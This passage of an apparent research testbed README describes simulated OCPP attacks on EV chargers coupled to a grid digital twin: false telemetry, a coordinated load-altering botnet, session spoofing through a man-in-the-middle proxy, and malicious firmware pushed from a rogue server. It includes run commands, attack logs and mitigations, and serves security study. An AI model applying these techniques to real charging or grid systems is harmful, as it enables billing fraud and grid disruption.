[GRD 09:10:23] Step 1 | 100.0 kW → ev_load_kw.txt | tick  1

  OVERLOAD STEP 2 — 200 kW reported
[GRD 09:10:43] Step 2 | 200.0 kW → ev_load_kw.txt | tick  1

  OVERLOAD STEP 3 — 300 kW reported
[GRD 09:11:03] Step 3 | 300.0 kW → ev_load_kw.txt | tick  1

  CLEANUP — load cleared, bus recovers
[GRD 09:11:23] Step 4 |   0.0 kW → ev_load_kw.txt | tick  1

  ATTACK 7 COMPLETE

  Grid evidence (read SimOutputBus.csv from shared volume):
  - Column vm_pu45: Bus 44 voltage — decreases with each step
  - Verified:    0 kW → 0.9689 pu  (387.6 V, baseline)
               100 kW → 0.9418 pu  (376.7 V — below IEC 0.95 limit)
               200 kW → 0.9093 pu  (363.7 V — protection relay risk)
               300 kW → 0.8694 pu  (347.8 V — 13% below nominal)
                 0 kW → 0.9689 pu  (recovery)

  Thesis evidence checklist:
  [x] Single rogue EVSE: no authentication, any ID accepted
  [x] Inflated MeterValues accepted by CSMS without verification
  [x] Each load step produces measurable Bus 44 voltage sag
  [x] Grid impact monotonically proportional to reported kW
  [x] Full recovery after load cleared (confirms coupling)
```

**Real-world grid impact — what actually happens vs. what the operator sees**

This is fundamentally a **telemetry / state-estimation integrity attack, not a physical brown-out.** A single charger sitting idle and reporting 300 kW draws *no real current* — nothing changes on the physical feeder. The vm_pu figures above are not measured terminal voltages; they are what the operator's PGTwin (a digital-twin / state-estimation model fed by OCPP telemetry) **computes from the forged input**. They represent what the operator would *believe* the grid is doing.

The real harm is therefore downstream of that false belief:

- **Corrupted situational awareness.** The control room's model shows Bus 44 collapsing to 0.87 pu while the feeder is actually healthy.
- **Wrong automated / operator action.** Any control logic built on that telemetry can react to a phantom — unnecessary load-shedding, curtailment of legitimate customers, or reactive-power dispatch. Inverted, falsified "healthy" readings could *mask* a genuine fault.
- **Single point of trust.** One unauthenticated unit is enough to move the operator's entire picture of a substation, because OCPP 1.6 applies no integrity check to MeterValues.

*If* that load were physically real (it is not, for one Level-2 unit — that is the meaning of the "27× over-report" label), the modeled voltages would translate as below. Read this as "what the model says the consequence would be," physically realised only when real load is actually present (see Attack 8):

| Modeled Bus 44 voltage | EN 50160 / IEC 60038 (400 V ±10 %) | Physical meaning *if the load were real* |
|---|---|---|
| 0.95 pu / 380 V | undervoltage onset | lights dim, sensitive electronics marginal |
| 0.90 pu / 360 V | at the lower limit | protection may begin to operate |
| 0.87 pu / 348 V | **outside the limit** | motor stalling, electronics dropout, undervoltage-relay trip → feeder lockout |

**Root cause:** No CP authentication; MeterValues are unsigned and unverified in OCPP 1.6; CSMS has no cross-check against physical metering data.  
**Mitigation:** OCPP 2.0.1 operator-signed `SetChargingProfile` per CP; CSMS plausibility check against rated connector capacity; smart meter cross-check.

---

### Attack 8 — Coordinated Load Altering + PGTwin Grid

**Script:** `attacks/attack_load_grid.py`  
**Profile:** `load-grid`  
**Network:** public-net (external botnet → CSMS) + shared Docker volume (OCPP→grid coupling)  
**Grid:** Dr. Biswas's 7-substation Singapore distribution network (`grid/ZSGplussync_docker.py`)

Attack #4 re-run against the real PGTwin instead of the toy grid twin. Five unauthenticated bot chargers connect to the CSMS over OCPP 1.6, execute coordinated load commands, and write the aggregated EV kW to a Docker shared volume file (`/shared/ev_load_kw.txt`). The PGTwin container reads this file before every `runpp()` call and injects the load at **Bus 44** (Load4, DS4, 0.4 kV, small industry feeder, baseline 100 kW).

**Coupling mechanism:**
```
[atk-load-grid] ──writes──► /shared/ev_load_kw.txt ◄──reads── [pgtwin]
   (OCPP MeterValues)           (Docker volume)              (pandapower runpp)
```

| Phase | Action | Bus 44 vm_pu | Total load |
|-------|--------|-------------|------------|
| Baseline | 5 bots × 11 kW = 55 kW reported | **0.9546** | 1345 kW |
| Surge | Same fleet, coordinated max | **0.9546** | 1345 kW |
| Drop | All bots → 0 kW | **0.9689** | 1290 kW |
| Oscillate | Toggle 0 ↔ 55 kW every 5 s | alternates | alternates |

```bash
docker compose --profile load-grid up --build --force-recreate
```

**Expected output — pgtwin container (key evidence: vm_pu sag on bot connect, recovery on drop):**
```
[PGTwin] 7-substation grid simulator running. EV load injected at Load4 (Bus 44).
[PGTwin] iter=   1 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW
[PGTwin] iter=   2 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW
...
[PGTwin] iter=1323 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW   ← DROP phase
...
[PGTwin] iter=2109 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW   ← OSCILLATE MAX
[PGTwin] iter=2110 | EV=   55.0 kW | Load4(Bus44) vm_pu=0.9546 | total_load=1345 kW
[PGTwin] iter=2111 | EV=   11.0 kW | Load4(Bus44) vm_pu=0.9662 | total_load=1301 kW   ← mid-transition
[PGTwin] iter=2112 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW   ← OSCILLATE ZERO
```

**Expected output — atk-load-grid container:**
```
  CSMS           : ws://csms:9000
  Bot fleet      : 5 chargers × 11 kW
  EV load file   : /shared/ev_load_kw.txt
  Phase duration : 30s each
  Grid target    : Load4 Bus 44 (DS4, 0.4 kV, small industry)

[OK  13:35:17] 5 bots registered with CSMS

  BASELINE — normal operation
[GRD 13:35:17] Tick  1 | all bots → 11 kW | total=55 kW → PGTwin

  ATTACK — COORDINATED DEMAND SURGE
[ATK 13:35:47] Tick  1 | SURGE all 5 bots → 11 kW | total=55 kW → PGTwin ⚡

  ATTACK — COORDINATED DEMAND DROP
[ATK 13:36:17] Tick  1 | DROP  all 5 bots → 0 kW | total=0 kW → PGTwin

  ATTACK — OSCILLATING LOAD
[ATK 13:36:47] Tick  1 | ▲ MAX  all bots → 11 kW | total=55 kW → PGTwin
[ATK 13:36:52] Tick  2 | ▼ ZERO all bots →  0 kW | total= 0 kW → PGTwin

  Fleet size   : 5 bots × 11 kW
  Peak load    : 55 kW injected at Bus 44 (Load4)

  Grid evidence (read from shared volume):
  - SimOutputBus.csv  → column vm_pu45 (Bus 44 voltage)
  - SimOutputLine.csv → column loading_percent40 (feeder to Load4)

  Thesis evidence checklist:
  [x] OCPP 1.6: no CP authentication — any ID accepted by CSMS
  [x] Surge phase: Load4 Bus 44 voltage sags in PGTwin CSV
  [x] Drop phase:  voltage rises, feeder loading drops
  [x] Oscillate:   repeated grid swings — relay wear risk
  [x] Grid impact visible in Dr. Biswas's ZSGplussync topology
```

**Real-world grid impact — the one attack with genuine physical potential**

Attack 8 is the only attack in this set that can move *real* power. If the botnet is actually switching real chargers on and off — a **load-altering / "MadIoT"-style attack** — rather than merely lying about telemetry, then 11 kW per charger is a **physically plausible** real load (a Level-2 AC charger genuinely draws that). Coordinated switching therefore produces a *real* demand swing, not just a modeled one.

Two consequences are physically realisable:

- **Coordinated surge / drop** — a synchronised step in real demand. At 55 kW (5 chargers) this is a **lab-scale demonstrator**; a feeder-level brown-out needs a fleet in the thousands. The *mechanism* scales, the demonstrator does not — do not read "5 chargers sag a substation."
- **Oscillation** — the toggle phase is a genuine rate-of-change-of-load event. Repeated 0 ↔ 55 kW swings stress on-load tap changers and risk ROCOF / ROCOL protection misoperation and relay wear. This is the more dangerous primitive at scale: synchronised oscillation across a large fleet is what the MadIoT literature shows can destabilise grid *frequency*, independent of the steady-state voltage level.

Voltage interpretation uses the same EN 50160 anchors as Attack 7 — but here, unlike Attack 7, the modeled sag corresponds to a *physically realisable* condition once the fleet is large enough.

**Root cause:** No CP authentication; no operator-signed charging profiles; OCPP 1.6 MeterValues are the sole load signal to the grid model.  
**Mitigation:** OCPP 2.0.1 `SetChargingProfile` with signed profiles; CSMS concurrent connection rate limiting; grid-side ROCOL (rate-of-change-of-load) protection relays.

---

### Attack 9 — Duration Spoofing + PGTwin Grid

**Script:** `attacks/attack_spoof_grid.py`  
**Profile:** `spoof-grid`  
**Network:** operator-net (172.19.0.42) + shared Docker volume  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

Attack #6 re-run against the real PGTwin. A MITM proxy on port 9004 intercepts the EVSE's `StopTransaction`, sends a forged ACK so the EVSE disconnects cleanly, then holds `/shared/ev_load_kw.txt` at the phantom load value for 60 seconds. During this window the EVSE is physically gone, but Bus 44 in the grid model remains depressed — an anomaly that cannot be detected from OCPP 1.6 alone.

| Phase | What happens | Bus 44 vm_pu |
|-------|-------------|-------------|
| 1 — Transparent relay | Real MeterValues forwarded; grid file updated with live kW | 0.9662 (11 kW) → 0.9532 (60 kW) |
| 2 — StopTransaction DROP | Intercepted; forged ACK sent; EVSE exits code 0 | held at phantom kW |
| 3 — Ghost session (60 s) | Synthetic MeterValues every 10 s; file held at 11 kW | **0.9662** — bus stressed, EVSE gone |
| 4 — Cleanup | `ev_load_kw.txt` cleared; final StopTransaction sent to CSMS | recovers to **0.9689** |

```bash
docker compose --profile spoof-grid up --build --force-recreate
```

**Expected output — atk-spoof-grid container:**
```
  Proxy listening  : ws://0.0.0.0:9004
  Forwarding to    : ws://csms:9000
  Ghost duration   : 60s
  Phantom load     : 11 kW
  Grid target      : Bus 44 (Load4, DS4, 0.4 kV)

[PRX 13:43:39] EVSE connected — opening upstream CSMS connection
[E→C 13:43:39] [BootNotification] → forwarding
[E→C 13:43:39] [StartTransaction] connectorId=1 → forwarding
[GRD 13:43:39] ev_load_kw.txt ← 11.0 kW  (PHANTOM — EVSE gone)
[E→C 13:43:49] [MeterValues] → forwarding + grid updated
[GRD 13:43:49] ev_load_kw.txt ← 60.0 kW  (PHANTOM — EVSE gone)

[ATK 13:43:59] ==============================================================
[ATK 13:43:59] PHASE 2 — StopTransaction INTERCEPTED AND DROPPED
[ATK 13:43:59]   EVSE 'CP_1' → NOT forwarded to CSMS
[ATK 13:43:59]   transactionId : 1
[ATK 13:43:59]   meterStop     : 332 Wh (real final reading)
[ATK 13:43:59]   EV load file  : HELD at 11 kW (phantom begins)
[ATK 13:43:59] Forged StopTransaction ACK sent to EVSE → EVSE disconnects cleanly

[GHO 13:43:59] PHASE 3 — GHOST SESSION ACTIVE
[GHO 13:43:59]   EVSE 'CP_1' physically gone
[GHO 13:43:59]   CSMS still sees active session (transactionId=1)
[GHO 13:43:59]   PGTwin still sees 11 kW at Bus 44 (ev_load_kw.txt held)
[GHO 13:43:59]   Ghost duration : 60s  (MeterValues every 10s)

[GRD 13:44:09] ev_load_kw.txt ← 11.0 kW  (PHANTOM — EVSE gone)
[GHO 13:44:09] Ghost MV #1 | t+10s | 362 Wh (+30 Wh) | Bus44 still loaded at 11 kW
[GRD 13:44:19] ev_load_kw.txt ← 11.0 kW  (PHANTOM — EVSE gone)
[GHO 13:44:19] Ghost MV #2 | t+20s | 392 Wh (+30 Wh) | Bus44 still loaded at 11 kW
...
[GHO 13:44:59] Ghost MV #6 | t+60s | 512 Wh (+30 Wh) | Bus44 still loaded at 11 kW
[GHO 13:44:59] Ghost ended — 0.1800 kWh phantom energy injected to CSMS
[GHO 13:44:59] PHASE 4 — clearing grid load and sending final StopTransaction
[GRD 13:44:59] ev_load_kw.txt ← 0.0 kW  (cleared)
[GHO 13:44:59] Final StopTransaction sent to CSMS: meterStop=512 Wh

  Proxy duration             : 80.1s
  Real charge energy         : 0.3320 kWh
  Phantom energy (CSMS)      : 0.1800 kWh
  Ghost MeterValues sent     : 6
  StopTransaction dropped    : YES

  PGTwin grid impact:
  - Bus 44 (Load4) vm_pu depressed for 60s after real disconnect
  - ev_load_kw.txt held at 11 kW during ghost phase
  - Visible in SimOutputBus.csv column vm_pu45
  - Operator sees: CSMS active session = 0.1800 kWh phantom load
  - Reality: EVSE physically idle, bus still stressed in grid model
```

**Expected output — pgtwin container (key evidence: vm_pu held at 0.9662 after EVSE gone):**
```
[PGTwin] iter=  46 | EV=   60.0 kW | Load4(Bus44) vm_pu=0.9532 | total_load=1350 kW
[PGTwin] iter=  47 | EV=   11.0 kW | Load4(Bus44) vm_pu=0.9662 | total_load=1301 kW
                                                          ↑ EVSE disconnects here (Phase 2)
[PGTwin] iter=  48 | EV=   11.0 kW | Load4(Bus44) vm_pu=0.9662 | total_load=1301 kW
...  (60 seconds of ghost phase — hundreds of iterations at 0.9662) ...
[PGTwin] iter= 750 | EV=    0.0 kW | Load4(Bus44) vm_pu=0.9689 | total_load=1290 kW
                                                          ↑ Phase 4 cleanup — bus recovers
```

**Real-world grid impact — billing & forecast integrity, zero physical effect**

Attack 9 has **no physical grid impact at all.** The EV has physically disconnected, so no current flows regardless of what any model says. It is purely a **data-integrity attack** on everything the operator builds on top of OCPP session state. The harm lies in three records that silently diverge from physical reality:

- **Billing fraud / disputes.** The CSMS books 0.18 kWh of phantom energy against a session that has already ended — a metering-integrity and revenue-assurance problem.
- **Corrupted demand forecasting & capacity reservation.** The operator's model holds Bus 44 "loaded" for 60 s after the car left, so demand forecasts, capacity reservation, and any settlement derived from session data are wrong. The operator reserves headroom for a load that isn't there (or, inverted, can be made to under-count real load).
- **State-estimate divergence.** This is the thesis point: "EVSE physically gone" and "grid model still loaded" cannot be reconciled from OCPP 1.6 alone, because there is no session-liveness signal tied to physical charger state.

The 60 s window and 11 kW are demonstrator values; the real attack surface is the **unbounded divergence** between physical reality and the operator's OCPP-derived view, not the specific magnitude.

**Root cause:** `StopTransaction` is unsigned; CSMS has no independent disconnect detection; OCPP 1.6 has no session-liveness timeout tied to physical charger state.  
**Mitigation:** WSS + mutual TLS (prevents MITM interposition); CSMS Heartbeat inactivity timeout; OCPP 2.0.1 signed `StopTransaction`; physical pilot-signal monitoring cross-checked against OCPP session state.

---

### Attack 10 — Coordinated Fleet Overload (realistic MV scale-up)

**Scripts:** `attacks/grid_ramp_analysis.py` (analysis) + `attacks/attack_load_grid.py` (live botnet at scale)  
**Profile:** `overload-fleet`  
**Network:** public-net botnet → CSMS; injection at **Load1 / Bus 21 (6.6 kV MV hub)**

Attack 10 answers the realism question raised in review: *one EVSE on a tiny bus is not a credible grid threat.* It is **not a new exploit** — it is the Attack 8 coordinated-load mechanism at **realistic fleet scale and a realistic connection point**, run as a ramp-to-failure study. The key variable is **where the load connects**, not the bot count.

**Injection point matters more than fleet size.** The same PGTwin model is targeted at two buses (`EV_LOAD_IDX` env var): the 0.4 kV small-industry feeder (Bus 44, the previous default) and a 6.6 kV MV hub (Bus 21), where a real charging hub would actually connect.

**Measured ramp-to-failure thresholds** (`python attacks/grid_ramp_analysis.py`):

| Threshold | **Bus 44** — 0.4 kV small feeder (worst case) | **Bus 21** — 6.6 kV MV hub (realistic) |
|---|---|---|
| vm_pu < 0.95 (IEC limit) | 75 kW | not reached (≤ 8 MW) |
| line loading ≥ 100% (thermal overload) | 170 kW | **5.55 MW** |
| vm_pu < 0.90 (relay risk) | 230 kW | not reached |
| transformer loading ≥ 100% | not reached | not reached |
| power-flow **collapse** (non-convergence) | **560 kW** | not reached (≤ 8 MW) |

**The finding (headline):** at a realistic MV connection the binding failure mode is **thermal line overload, not voltage collapse** — a coordinated fleet must reach **~5.5 MW** to drive a feeder past 100% (where overcurrent protection trips and drops the feeder), while bus voltage barely moves. Voltage *collapse* only appears when a hub-scale load is unrealistically concentrated on the tiny 0.4 kV bus (560 kW). This bridges to the paper's Singapore extrapolation: ~5.5 MW overloads one MV feeder, so a 90 MW botnet (10% of a 60,000-charger build-out) could overload many feeders at once.

**Live demonstration through the OCPP→grid coupling:**

```bash
docker compose --profile overload-fleet up --build --force-recreate
```

A botnet of 20 HPC DC-fast chargers × 300 kW = **6.0 MW** reports its load over OCPP; `pgtwin-mv` injects it at Bus 21 and logs the feeder overload (verified):

```
[PGTwin] EV load injected at Load1 (Bus 21, 6.6 kV).
[PGTwin] iter= 982 | EV=6000.0 kW | Bus21 vm_pu=0.9864 | max_line_loading=106.9% | total_load=7290 kW  *** LINE OVERLOAD ***
[ATK] Tick 1 | SURGE all 20 bots → 300 kW | total=6000 kW → PGTwin
```

Note `vm_pu=0.9864` (voltage healthy) with `max_line_loading=106.9%` (feeder overloaded) — exactly the realistic failure mode.

**Honesty / scope:** this is a *static* power flow. "Shutdown" = voltage collapse (non-convergence) **plus** protection thresholds crossed; the model does not trip breakers or cascade on its own (adding line-trip logic to show cascading is a documented future extension). Transformer thermal never binds on this grid (loads are small vs the 25 MVA transformers); the constraints are **line ampacity** (MV) and **bus voltage** (LV) — measured, not assumed. True multi-bus *distribution* of the fleet (vs. repointing to one MV bus) would require extending the single-float `ev_load_kw.txt` contract, and is left as future work.

**Artifacts:** `captures/grid_csv/attack10_ramp_sweep.csv` (full sweep) and `captures/grid_csv/figures/figureE_ramp_to_failure.png` (LV vs. MV, voltage and line-loading vs. injected MW).

**Root cause:** No per-CP rate limiting or signed charging-profile enforcement; the CSMS accepts unbounded aggregate load from cloned chargers.  
**Mitigation:** OCPP 2.0.1 operator-signed `SetChargingProfile` caps per-CP and aggregate load; CSMS concurrent-connection / load-ramp rate limiting; grid-side ROCOL and overcurrent protection (the realistic backstop — the feeder trips before damage).

---

### Grid Topology Visualiser

**Script:** `attacks/a6breakers.py`

Builds the full grid twin (220 kV → 66 kV → 22 kV, 7 town loads × 200 MW, 500 EV chargers × 220 kW) and exports an interactive Plotly diagram to `grid_visualization.html`. Run locally — not included in Docker profiles.

```bash
python attacks/a6breakers.py
```

---

## OCPP 2.0.1 Tracks

A self-contained study of OCPP **2.0.1**, independent of Attacks 1–9 (those remain OCPP 1.6) and living entirely under `v201/`. It has **two complementary halves**, which together answer "what does migrating to 2.0.1 actually change?":

| Track | Folder | Profile | Shows |
|-------|--------|---------|-------|
| **1 — Survival** | `v201/core`, `v201/attacks` | plaintext (Profile 1) | Data-integrity attacks (FDI, overload) **still work** — message model changes, outcome doesn't |
| **2 — Prevention** | `v201/secure` | mutual-TLS (Profile 3) + signed firmware | MITM (3a/3b/6) and firmware RCE (5) are **blocked** — shown failing |

The crucial distinction running through both: **prevention comes from the Security Profile (TLS, mutual TLS, signed firmware), not the protocol version.** Track 1 is plaintext on purpose (to isolate the message model); Track 2 turns on the security controls (to show what blocks the attacks). See `OCPP_2.0.1_Compatibility_Evaluation.docx` for the full prevented-vs-survives analysis.

---

## OCPP 2.0.1 — Track 1: Survival (plaintext)

A track that re-runs the **data-integrity attacks** against a plaintext OCPP **2.0.1** CSMS.

### Why this track exists, and what it deliberately is not

This track runs on **plaintext `ws://` — the OCPP 2.0.1 insecure-profile equivalent (Security Profile 1: no TLS, no mutual-TLS).** That is intentional. The goal is to isolate **one variable** — the message model — and answer a precise question:

> *When you migrate an attack from OCPP 1.6 to 2.0.1's message format, does it still work?*

The comparison is therefore **1.6-plaintext vs 2.0.1-plaintext**. The only thing that changes is the envelope: 2.0.1 replaces `StartTransaction` / `MeterValues` / `StopTransaction` with a unified `TransactionEvent` (Started / Updated / Ended), and nests `BootNotification` under `chargingStation` + `reason`.

**Only the attacks that survive 2.0.1 are ported** (per the compatibility evaluation — see `OCPP_2.0.1_Compatibility_Evaluation.docx`):

| 1.6 Attack | Ported to 2.0.1? | Reason |
|-----------|------------------|--------|
| 2 — False Data Injection | ✅ `attack_fdi_v201.py` | Authenticated-insider data lie; no plausibility check in 2.0.1 |
| 7 — Single EVSE Overload | ✅ `attack_overload_v201.py` | Same data-integrity class; drives PGTwin via shared volume |
| 3a / 3b / 6 — MITM family | → Track 2 | Defeated by **TLS** (the security profile), not the protocol version |
| 5 — Firmware RCE | → Track 2 | Defeated by **signed firmware** (the security profile), not the version |

MITM and firmware are not in *this* track **because** 2.0.1 prevents them — but only via TLS/signing, which is a *security-profile* property, not a *protocol-version* one. They are demonstrated being **blocked** in Track 2 (Prevention) below.

### Architecture

The OCPP 2.0.1 CSMS runs on **port 9100** (vs 9000 for 1.6), dual-homed on both networks. The grid coupling is unchanged — **PGTwin never parses OCPP; it reads a kW float from `/shared/ev_load_kw.txt`** — so the 2.0.1 overload drives the exact same grid response as the 1.6 version.

```
  v201/attacks/*  ──(OCPP 2.0.1 TransactionEvent)──►  csms-v201 :9100
        │                                                  (logs power, no check)
        └──(writes kW float, overload only)──► /shared/ev_load_kw.txt ──► pgtwin
```

### Run scenarios

```bash
# 2.0.1 baseline — CSMS + legitimate 2.0.1 EVSE (honest TransactionEvents)
docker compose --profile v201-normal up --build

# 2.0.1 False Data Injection — compromised authenticated charger lies via TransactionEvent
docker compose --profile v201-fdi up --build

# 2.0.1 Single EVSE Overload + PGTwin grid (same staircase as 1.6 Attack 7)
docker compose --profile v201-overload-grid up --build --force-recreate
```

### Attack A — False Data Injection on 2.0.1 (`attack_fdi_v201.py`)

The 2.0.1 re-implementation of Attack 2. A compromised but authenticated charger fabricates its power in `TransactionEvent[Updated]` frames. Three phases: honest → under-report (hide load) → over-report (phantom load).

**Verified CSMS-v201 output (key evidence — the operator sees the lie, logged verbatim):**
```
[CSMS-v201] Connected: CP-201-1
[CSMS-v201] BootNotification from: CP-201-1 (Compromised-Vendor / FDI-Demo-201) reason=PowerUp
[CSMS-v201] CP-201-1 | TransactionEvent[Updated] txId=TX-201-FDI seq=1  | Power = 60.0 kW   ← Phase 1 honest
[CSMS-v201] CP-201-1 | TransactionEvent[Updated] txId=TX-201-FDI seq=11 | Power = 0.0 kW     ← Phase 2 hides 60 kW
[CSMS-v201] CP-201-1 | TransactionEvent[Updated] txId=TX-201-FDI seq=17 | Power = 999.0 kW   ← Phase 3 phantom load
```

The gap between what the charger draws and what the CSMS logs is identical to the 1.6 attack — proving the vulnerability is in the **data layer**, not the protocol version. This holds **regardless of security profile**: TLS/mutual-TLS authenticate the channel and device, not the truthfulness of the data.

### Attack B — Single EVSE Overload on 2.0.1 (`attack_overload_v201.py`)

The 2.0.1 re-implementation of Attack 7. A single rogue charger reports inflated power via `TransactionEvent[Updated]` and writes the same `/shared/ev_load_kw.txt` the 1.6 version does.

**Verified — the 2.0.1 attack chain end-to-end:**
```
# CSMS-v201 logs the fabricated TransactionEvent power (no plausibility check):
[CSMS-v201] ATK-201-OVERLOAD-001 | TransactionEvent[Updated] seq=11 | Power = 100.0 kW
[CSMS-v201] ATK-201-OVERLOAD-001 | TransactionEvent[Updated] seq=21 | Power = 200.0 kW
[CSMS-v201] ATK-201-OVERLOAD-001 | TransactionEvent[Updated] seq=31 | Power = 300.0 kW

# pgtwin grid response — byte-identical to the 1.6 Attack 7 (grid reads a float):
[PGTwin] iter= 401 | EV=  100.0 kW | Load4(Bus44) vm_pu=0.9418 | total_load=1390 kW
[PGTwin] iter= 855 | EV=  200.0 kW | Load4(Bus44) vm_pu=0.9093 | total_load=1490 kW
[PGTwin] iter=1260 | EV=  300.0 kW | Load4(Bus44) vm_pu=0.8694 | total_load=1590 kW
```

The grid staircase (0.9418 → 0.9093 → 0.8694 pu) is the same as Attack 7 — confirming that the protocol version changes the message envelope, not the physical outcome.

### Follow logs (Track 1)

```bash
docker logs -f csms-v201          # 2.0.1 CSMS — logs every TransactionEvent power
docker logs -f atk-fdi-v201       # FDI attack terminal (real vs reported)
docker logs -f atk-overload-v201  # overload attack terminal
docker logs -f pgtwin             # grid response (overload profile only)
```

---

## OCPP 2.0.1 — Track 2: Prevention (Security Profile 3 + signed firmware)

The complementary half: the attacks 2.0.1's **security profile** blocks, shown **failing**. Lives under `v201/secure/`, runs on **wss:// port 9101** with **mutual TLS** (Profile 3) and **signed firmware**.

### Calibration — what these demos prove (and what they don't)

The block is achieved **by the security profile** (TLS + certificate validation + firmware signing), **not by the OCPP version number**. A plaintext 2.0.1 CSMS is exactly as exposed as a plaintext 1.6 one (that is Track 1). The honest, defensible claim is the **side-by-side**:

> *Same attack — succeeds on the plaintext track, blocked under Security Profile 3.*

Do **not** read these as "OCPP 2.0.1 prevents MITM." Read them as "under correctly-deployed Profile 3 with signed firmware, these attacks are prevented."

### PKI

`gen_certs.py` builds the trust chain, baked into the image at build time (`/certs`) so every container shares one CA: root CA, server cert (SAN `csms-secure-v201`), legitimate client cert (mutual TLS), and a manufacturer firmware-signing keypair. Attacker containers deliberately do **not** use these CA-signed materials — a real attacker would not possess them — so the demos stay faithful (the MITM proxy self-signs; the malicious firmware is signed by an attacker key).

### Run scenarios

```bash
# Secure baseline — mutual-TLS CSMS + EVSE (handshake succeeds, honest traffic)
docker compose --profile v201-secure-normal up --build

# MITM (Attacks 3a/3b/6) blocked by TLS certificate validation
docker compose --profile v201-secure-mitm up --build

# Firmware RCE (Attack 5) blocked by signed-firmware verification
docker compose --profile v201-secure-firmware up --build
```

### Demo A — MITM blocked by TLS (Attacks 3a / 3b / 6)

A proxy attempts the same interposition as the 1.6 MITM attacks, against a Profile-3 deployment. It can only present a **self-signed** certificate; the EVSE validates the server cert against the trust anchor and refuses.

**Verified — both directions blocked:**
```
# EVSE (victim) terminal — the decisive evidence:
  BLOCKED — server certificate verification FAILED
  self-signed certificate
  The EVSE refused the connection — no OCPP frame sent.
  Attack prevented (OCPP 2.0.1 Security Profile 2/3, TLS).

# MITM proxy (attacker) terminal:
[MITM] upstream to real CSMS BLOCKED (no valid client certificate)
[MITM] EVSE will reject our self-signed certificate at the TLS handshake
```

The man-in-the-middle never establishes a channel, so the MeterValues tampering / StopTransaction injection / StopTransaction-drop that all succeed on the plaintext track are impossible — not because of the OCPP version, but because TLS + cert validation is deployed.

### Demo B — Malicious firmware blocked by signed firmware (Attack 5)

This is the **application-layer** OCPP 2.0.1 control — not just transport encryption. The scenario grants the attacker the *strongest* position: a **compromised but mutual-TLS-authenticated CSMS** pushes an `UpdateFirmware` pointing at a rogue server. The firmware reaches the EVSE. The question is whether it installs.

It does not. The EVSE verifies the firmware signature against the **pinned manufacturer key**; the payload is signed with the attacker's key, so verification fails.

**Verified end-to-end:**
```
[CSMS-SEC]  FIRMWARE ATTACK — compromised authenticated CSMS
[CSMS-SEC]  Pushing UpdateFirmware -> http://atk-firmware-secure:8090/firmware.bin
[ROGUE-FW] served malicious payload (182 bytes) -> EVSE
[ROGUE-FW] served signature (256 bytes, attacker key)
[EVSE-SEC] Downloaded 182 bytes + 256 byte signature
[EVSE-SEC] Verifying signature against pinned manufacturer key ...
[CSMS-SEC]  FirmwareStatusNotification: InvalidSignature  <- EVSE REJECTED FIRMWARE
[EVSE-SEC]  BLOCKED — firmware signature INVALID
[EVSE-SEC]  EVSE REFUSES TO INSTALL — attack prevented
```

Transport TLS alone would not stop a *compromised* CSMS — signed firmware does. The EVSE emits the native OCPP 2.0.1 `FirmwareStatusNotification(InvalidSignature)` and refuses to install.

### Why the partial-prevention attacks (1, 4) are NOT demoed here

SaiFlow (1) and Load altering (4) are only *partially* addressed by 2.0.1: mutual TLS blocks an **external** attacker (no client cert), but SaiFlow's duplicate-connection collision-handling flaw **persists in 2.0.1**, and a compromised *authenticated* fleet still alters load (which Track 1 already shows). Demoing them as "prevented" would falsely imply 2.0.1 fixes them. They are covered in the prose evaluation (`OCPP_2.0.1_Compatibility_Evaluation.docx`), not as running prevention code.

### Follow logs (Track 2)

```bash
docker logs -f evse-secure-mitm     # MITM victim — prints BLOCKED at handshake
docker logs -f atk-mitm-secure      # MITM proxy — blocked both directions
docker logs -f evse-secure-fw       # firmware victim — InvalidSignature / REFUSES TO INSTALL
docker logs -f csms-secure-v201-fw  # compromised CSMS pushing malicious firmware
```

---

## References

- Saposnik, L.R. & Porat, D. (2023). *Hijacking EV charge points to cause DoS.* SaiFlow Security Advisory.
- Johnson et al. (2023). *Disrupting EV Charging Sessions.* Idaho National Laboratory, INL/CON-23-72329.
- Open Charge Alliance. *OCPP 1.6 Specification.*
- Open Charge Alliance. *OCPP 2.0.1 Security Whitepaper.*
